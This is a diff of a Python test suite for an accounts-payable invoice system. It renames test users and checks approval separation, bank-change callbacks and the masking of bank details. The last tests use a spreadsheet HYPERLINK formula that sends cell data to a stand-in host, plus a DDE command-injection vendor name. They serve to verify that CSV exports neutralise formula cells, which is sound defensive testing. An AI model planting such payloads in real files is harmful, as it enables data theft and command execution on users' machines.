@@ -69,7 +69,7 @@ def pdf(
     )
 
 
-def ingest(content: bytes, who: str = "cleo.clerk") -> int:
+def ingest(content: bytes, who: str = "ap.clerk") -> int:
     with session_scope() as db:
         return service.ingest(db, principal(who), "invoice.pdf", content).id
 
@@ -94,7 +94,7 @@ def test_garbled_field_needs_verification_then_matches(vendor_po):
     iid = ingest(pdf(garble=["total"]))
     assert status(iid) == "needs_verification"
     with session_scope() as db:
-        service.verify(db, principal("cleo.clerk"), iid, {"total_cents": 220_000}, "checked against PDF")
+        service.verify(db, principal("ap.clerk"), iid, {"total_cents": 220_000}, "checked against PDF")
     assert status(iid) == "matched"
 
 
@@ -104,14 +104,14 @@ def test_every_verifier_is_excluded_from_approving(vendor_po):
     from app.foundation.registry import get_registry
 
     roles = frozenset({"AP.Clerk", "AP.Approver"})
-    dual = replace(principal("abe.approver"), roles=roles, permissions=get_registry().permissions_for(roles))
+    dual = replace(principal("ap.approver"), roles=roles, permissions=get_registry().permissions_for(roles))
     iid = ingest(pdf(number="SOD1", garble=["invoice_date", "total"]))
     with session_scope() as db:
         service.verify(db, dual, iid, {"invoice_date": "2026-10-01"}, "checked date against PDF")
     assert status(iid) != "matched"
     with session_scope() as db:  # a later verifier must not clear the earlier one's exclusion
-        service.verify(db, principal("cleo.clerk"), iid, {"total_cents": 220_000}, "checked total")
-        service.submit(db, principal("cleo.clerk"), iid, "ready to pay")
+        service.verify(db, principal("ap.clerk"), iid, {"total_cents": 220_000}, "checked total")
+        service.submit(db, principal("ap.clerk"), iid, "ready to pay")
         rid = service.get(db, iid).approval_request_id
         assert (
             dual.oid
@@ -120,7 +120,7 @@ def test_every_verifier_is_excluded_from_approving(vendor_po):
     with session_scope() as db, pytest.raises(Forbidden):
         approvals.decide(db, dual, rid, "approve", "I set the date")
     with session_scope() as db:
-        approvals.decide(db, principal("cam.controller"), rid, "approve", "independent check")
+        approvals.decide(db, principal("finance.controller"), rid, "approve", "independent check")
     assert status(iid) == "approved"
 
 
@@ -140,17 +140,17 @@ def test_negative_amounts_are_exceptions_and_never_lower_po(vendor_po):
     iid = ingest(pdf(number="CR1", unit=-1_000_000, qty=1))
     assert status(iid) == "exception" and "negative_amount" in _issues(iid)
     with pytest.raises(Conflict), session_scope() as db:
-        service.submit(db, principal("cleo.clerk"), iid, "credit note")
+        service.submit(db, principal("ap.clerk"), iid, "credit note")
     ok = ingest(pdf(number="OK1"))
     with session_scope() as db, pytest.raises(Invalid):
-        service.verify(db, principal("cleo.clerk"), iid, {"total_cents": -1}, "typo")
+        service.verify(db, principal("ap.clerk"), iid, {"total_cents": -1}, "typo")
     with session_scope() as db:
-        service.submit(db, principal("cleo.clerk"), ok, "ready to pay")
+        service.submit(db, principal("ap.clerk"), ok, "ready to pay")
         rid = service.get(db, ok).approval_request_id
     with session_scope() as db:  # amount tampered after submit: approval must not lower invoiced_cents
         service.get(db, ok).total_cents = -1_000_000
     with pytest.raises(Conflict), session_scope() as db:
-        approvals.decide(db, principal("abe.approver"), rid, "approve", "matches PO")
+        approvals.decide(db, principal("ap.approver"), rid, "approve", "matches PO")
     with session_scope() as db:
         assert db.execute(select(PurchaseOrder)).scalar_one().invoiced_cents == 0
 
@@ -164,8 +164,8 @@ def test_tiered_sequential_approval_and_separation(vendor_po):
     small = ingest(pdf(number="S1"))
     big = ingest(pdf(number="B1", unit=600_000))  # 1.32M cents incl tax >= 1M tier-2 threshold
     with session_scope() as db:
-        service.submit(db, principal("cleo.clerk"), small, "ready to pay")
-        service.submit(db, principal("cleo.clerk"), big, "ready to pay")
+        service.submit(db, principal("ap.clerk"), small, "ready to pay")
+        service.submit(db, principal("ap.clerk"), big, "ready to pay")
     with session_scope() as db:
         rid_small, rid_big = (
             service.get(db, small).approval_request_id,
@@ -173,16 +173,16 @@ def test_tiered_sequential_approval_and_separation(vendor_po):
         )
     assert rid_small and rid_big
     with session_scope() as db:
-        approvals.decide(db, principal("abe.approver"), rid_small, "approve", "matches PO")
+        approvals.decide(db, principal("ap.approver"), rid_small, "approve", "matches PO")
     assert status(small) == "approved"
     with session_scope() as db:
-        approvals.decide(db, principal("abe.approver"), rid_big, "approve", "matches PO")
+        approvals.decide(db, principal("ap.approver"), rid_big, "approve", "matches PO")
     assert status(big) == "pending_approval"
     with session_scope() as db:  # replaying the same decision is idempotent and cannot satisfy stage 2
-        approvals.decide(db, principal("abe.approver"), rid_big, "approve", "second time")
+        approvals.decide(db, principal("ap.approver"), rid_big, "approve", "second time")
     assert status(big) == "pending_approval"
     with session_scope() as db:
-        approvals.decide(db, principal("cam.controller"), rid_big, "approve", "controller ok")
+        approvals.decide(db, principal("finance.controller"), rid_big, "approve", "controller ok")
     assert status(big) == "approved"
     with session_scope() as db:
         assert db.execute(select(PurchaseOrder)).scalar_one().invoiced_cents == 220_000 + 1_320_000
@@ -194,20 +194,20 @@ def test_bank_change_needs_callback_by_other_person_then_third_approver(vendor_p
     assert "bank_details_differ" in _issues(iid)
     with session_scope() as db:
         bid = service.request_bank_change(
-            db, principal("cleo.clerk"), vid, from_invoice=iid, reason="new details on invoice"
+            db, principal("ap.clerk"), vid, from_invoice=iid, reason="new details on invoice"
         ).id
     with session_scope() as db, pytest.raises(Forbidden):
-        service.record_callback(db, principal("cleo.clerk"), bid, True, "called myself")
+        service.record_callback(db, principal("ap.clerk"), bid, True, "called myself")
     with session_scope() as db:
         service.record_callback(
-            db, principal("abe.approver"), bid, True, "Called +1-555-0100 on file; CFO confirmed change"
+            db, principal("ap.approver"), bid, True, "Called +1-555-0100 on file; CFO confirmed change"
         )
         rid = db.get(BankChange, bid).approval_request_id
     assert rid
     with session_scope() as db, pytest.raises(Forbidden):
-        approvals.decide(db, principal("abe.approver"), rid, "approve", "I did the call")
+        approvals.decide(db, principal("ap.approver"), rid, "approve", "I did the call")
     with session_scope() as db:
-        approvals.decide(db, principal("cam.controller"), rid, "approve", "verified evidence")
+        approvals.decide(db, principal("finance.controller"), rid, "approve", "verified evidence")
     with session_scope() as db:
         assert db.get(Vendor, vid).bank_account == "9999999999"
     assert status(iid) == "matched"
@@ -216,15 +216,15 @@ def test_bank_change_needs_callback_by_other_person_then_third_approver(vendor_p
 def test_batch_only_includes_approved_and_is_audited(vendor_po):
     iid = ingest(pdf(number="P1"))
     with session_scope() as db:
-        service.submit(db, principal("cleo.clerk"), iid, "ready")
+        service.submit(db, principal("ap.clerk"), iid, "ready")
         rid = service.get(db, iid).approval_request_id
     with session_scope() as db:
-        approvals.decide(db, principal("abe.approver"), rid, "approve", "ok to pay")
+        approvals.decide(db, principal("ap.approver"), rid, "approve", "ok to pay")
     with session_scope() as db:
-        b = service.create_batch(db, principal("cam.controller"), "weekly run")
+        b = service.create_batch(db, principal("finance.controller"), "weekly run")
         assert b.count == 1 and "P1" in b.content and service.get(db, iid).status == "batched"
     with session_scope() as db, pytest.raises(Invalid):
-        service.create_batch(db, principal("cam.controller"), "nothing left")
+        service.create_batch(db, principal("finance.controller"), "nothing left")
 
 
 def raw_pdf(*bodies: bytes, trailer_extra: bytes = b"") -> bytes:
@@ -443,20 +443,20 @@ def test_money_parse():
 
 
 def test_api_masks_bank_details_and_permissions(login, vendor_po):
-    c = login("cleo.clerk")
+    c = login("ap.clerk")
     r = c.post("/api/ap/invoices", files={"file": ("inv.pdf", pdf(number="API1"), "application/pdf")})
     assert r.status_code == 200, r.text
     assert r.json()["remit_account"] != ACCT and r.json()["status"] == "matched"
     assert (
         c.post("/api/ap/invoices", files={"file": ("x.exe", b"MZ\x90", "application/pdf")}).status_code == 422
     )
-    assert login("abe.approver").post("/api/ap/batches", json={"reason": "not allowed"}).status_code == 403
-    assert login("erin.engineer").get("/api/ap/invoices").status_code == 403
+    assert login("ap.approver").post("/api/ap/batches", json={"reason": "not allowed"}).status_code == 403
+    assert login("flags.engineer").get("/api/ap/invoices").status_code == 403
     assert c.get(f"/api/ap/invoices/{r.json()['id']}/file").content.startswith(b"%PDF")
 
 
 def test_no_bank_detail_anywhere_in_invoice_json(login, vendor_po):
-    c = login("cleo.clerk")
+    c = login("ap.clerk")
     iid = c.post(
         "/api/ap/invoices", files={"file": ("inv.pdf", pdf(number="LEAK1"), "application/pdf")}
     ).json()["id"]
@@ -577,9 +577,9 @@ def test_seed_runs():
 def test_resubmit_conflict(vendor_po):
     iid = ingest(pdf(number="R1"))
     with session_scope() as db:
-        service.submit(db, principal("cleo.clerk"), iid, "ready")
+        service.submit(db, principal("ap.clerk"), iid, "ready")
     with session_scope() as db, pytest.raises(Conflict):
-        service.submit(db, principal("cleo.clerk"), iid, "again")
+        service.submit(db, principal("ap.clerk"), iid, "again")
 
 
 FORMULA = '=HYPERLINK("https://x.example/?"&G2&H2,"open")'
@@ -591,12 +591,12 @@ def test_formula_invoice_number_needs_verification_and_cannot_be_verified(vendor
     with session_scope() as db:
         assert service.get(db, iid).invoice_number == FORMULA
         with pytest.raises(Invalid, match="invoice_number"):
-            service.verify(db, principal("cleo.clerk"), iid, {"invoice_number": "@SUM(1)"}, "typo")
+            service.verify(db, principal("ap.clerk"), iid, {"invoice_number": "@SUM(1)"}, "typo")
     with session_scope() as db:
-        service.verify(db, principal("cleo.clerk"), iid, {"total_cents": 220_000}, "checked totals only")
+        service.verify(db, principal("ap.clerk"), iid, {"total_cents": 220_000}, "checked totals only")
     assert status(iid) == "exception" and "invalid_invoice_number" in _issues(iid)
     with session_scope() as db:
-        service.verify(db, principal("cleo.clerk"), iid, {"invoice_number": "INV-77"}, "from vendor call")
+        service.verify(db, principal("ap.clerk"), iid, {"invoice_number": "INV-77"}, "from vendor call")
     assert status(iid) == "matched"
 
 
@@ -606,11 +606,11 @@ def test_batch_file_neutralizes_formula_cells(vendor_po):
         inv = service.get(db, iid)
         inv.invoice_number = FORMULA  # bypass validation: the file writer must still be safe
         db.get(Vendor, inv.vendor_id).name = "+cmd|' /C calc'!A0"
-        service.submit(db, principal("cleo.clerk"), iid, "ready")
+        service.submit(db, principal("ap.clerk"), iid, "ready")
         rid = inv.approval_request_id
     with session_scope() as db:
-        approvals.decide(db, principal("abe.approver"), rid, "approve", "ok to pay")
+        approvals.decide(db, principal("ap.approver"), rid, "approve", "ok to pay")
     with session_scope() as db:
-        b = service.create_batch(db, principal("cam.controller"), "weekly run")
+        b = service.create_batch(db, principal("finance.controller"), "weekly run")
         row = next(csv.reader(io.StringIO(b.content.splitlines()[1])))
     assert row[1] == "'+cmd|' /C calc'!A0" and row[2] == "'" + FORMULA
